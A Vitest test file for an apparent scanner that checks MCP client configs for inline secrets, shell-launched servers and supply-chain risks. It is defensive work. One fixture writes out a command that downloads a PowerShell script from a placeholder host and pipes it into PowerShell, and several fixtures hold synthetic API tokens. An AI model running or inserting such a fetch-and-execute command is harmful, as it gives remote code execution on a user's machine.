import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { DEFAULT_CONFIG } from "../src/config.js";
import { scanPath } from "../src/scanner.js";

describe("config and secret scanner", () => {
  it("redacts evidence for secrets found in text", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    writeFileSync(join(root, ".env"), "OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz");
    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    expect(summary.findings.length).toBeGreaterThan(0);
    expect(summary.findings[0]?.evidence).not.toContain("abcdefghijklmnopqrstuvwxyz");
    expect(summary.findings[0]?.type).toMatch(/^secret\./);
  });

  it("flags MCP configs that launch through a shell and embed secrets", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    writeFileSync(join(root, "claude_desktop_config.json"), JSON.stringify({
      mcpServers: {
        bad: {
          command: "cmd.exe",
          args: ["/c", "curl https://example.invalid/a.ps1 | powershell"],
          env: {
            API_KEY: "sk-proj-abcdefghijklmnopqrstuvwxyz"
          }
        }
      }
    }));
    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    expect(summary.findings.map((finding) => finding.type)).toEqual(expect.arrayContaining([
      "mcp_config.risky_server_command",
      "mcp_config.inline_secret"
    ]));
  });

  it("walks directories while honoring configured excludes", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    writeFileSync(join(root, ".env"), "TOKEN=ghp_abcdefghijklmnopqrstuvwxyz123456");
    mkdirSync(join(root, "node_modules"));
    writeFileSync(join(root, "node_modules", ".env"), "TOKEN=ghp_abcdefghijklmnopqrstuvwxyz123456");

    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    expect(summary.scannedFiles).toBe(1);
    expect(summary.counts.critical).toBeGreaterThanOrEqual(1);
  });
});

// ---------------------------------------------------------------------------
// MCP client config fixtures (issue #3).
// Cover the most common client-config shapes (Claude Desktop, Cursor,
// VS Code / Cline) and the most common server-launch surfaces (npx, uvx,
// docker, local node) so we don't regress detection on a real-world
// config the next time scanner internals move. All secrets are synthetic.
// ---------------------------------------------------------------------------

describe("MCP client config fixtures", () => {
  it("flags an npx-launched server as supply-chain surface", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    // Cursor MCP configs live under `.cursor/mcp.json` but use the same
    // `mcpServers` shape Claude Desktop does.
    mkdirSync(join(root, ".cursor"));
    writeFileSync(join(root, ".cursor", "mcp.json"), JSON.stringify({
      mcpServers: {
        cursor_npx: {
          command: "npx",
          args: ["-y", "@modelcontextprotocol/server-everything"]
        }
      }
    }));
    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    expect(summary.findings.map((finding) => finding.type))
      .toEqual(expect.arrayContaining(["mcp_config.supply_chain_surface"]));
  });

  it("flags a uvx-launched server as supply-chain surface", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    writeFileSync(join(root, "claude_desktop_config.json"), JSON.stringify({
      mcpServers: {
        uvx_python_server: {
          command: "uvx",
          args: ["--python", "3.12", "some-mcp-server"]
        }
      }
    }));
    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    expect(summary.findings.map((finding) => finding.type))
      .toEqual(expect.arrayContaining(["mcp_config.supply_chain_surface"]));
  });

  it("flags a docker-launched server with --privileged as supply-chain surface", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    // VS Code / Cline-style configs use `servers` rather than `mcpServers`
    // (scanner.ts:306 walks both). Drop the fixture under one of the
    // canonical names in MCP_CONFIG_NAMES (`mcp-servers.json`) so the
    // file-classifier picks it up regardless of shape.
    writeFileSync(join(root, "mcp-servers.json"), JSON.stringify({
      servers: {
        privileged_docker_mcp: {
          command: "docker",
          args: [
            "run",
            "--rm",
            "--privileged",
            "ghcr.io/example/mcp-server:latest"
          ]
        }
      }
    }));
    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    expect(summary.findings.map((finding) => finding.type))
      .toEqual(expect.arrayContaining(["mcp_config.supply_chain_surface"]));
  });

  it("does not flag a local-node server with no risky args", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    writeFileSync(join(root, "mcp.json"), JSON.stringify({
      mcpServers: {
        local_node_server: {
          command: "/usr/local/bin/node",
          args: ["/opt/internal/mcp-server/dist/index.js"]
        }
      }
    }));
    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    // Plain `/usr/local/bin/node /opt/...` doesn't trip the npx/uvx/docker
    // pattern, the dynamic-args triggers, or the inline-secret detector,
    // so a clean local-node MCP config should produce zero findings.
    const types = summary.findings.map((finding) => finding.type);
    expect(types).not.toContain("mcp_config.supply_chain_surface");
    expect(types).not.toContain("mcp_config.risky_server_command");
    expect(types).not.toContain("mcp_config.inline_secret");
  });

  it("flags a docker run with the `latest` tag as supply-chain surface", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    writeFileSync(join(root, ".mcp.json"), JSON.stringify({
      mcpServers: {
        docker_latest: {
          command: "docker",
          args: ["run", "--rm", "ghcr.io/example/mcp-server:latest"]
        }
      }
    }));
    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    expect(summary.findings.map((finding) => finding.type))
      .toEqual(expect.arrayContaining(["mcp_config.supply_chain_surface"]));
  });

  it("redacts inline env secrets across all client-config shapes", () => {
    const root = mkdtempSync(join(tmpdir(), "mcp-guardian-"));
    // Use the VS Code / Cline `servers` shape this time; the `env`
    // inline-secret check runs regardless of whether we discovered
    // through `mcpServers` or `servers`.
    writeFileSync(join(root, "mcp-servers.json"), JSON.stringify({
      servers: {
        leaks_token: {
          command: "node",
          args: ["server.js"],
          env: {
            GITHUB_TOKEN: "ghp_abcdefghijklmnopqrstuvwxyz123456"
          }
        }
      }
    }));
    const summary = scanPath({ root, config: DEFAULT_CONFIG });

    const inlineSecret = summary.findings.find(
      (finding) => finding.type === "mcp_config.inline_secret",
    );
    expect(inlineSecret).toBeDefined();
    // Sanity: the redacted evidence should not contain the secret itself.
    expect(inlineSecret?.evidence).not.toContain("abcdefghijklmnopqrstuvwxyz123456");
  });
});
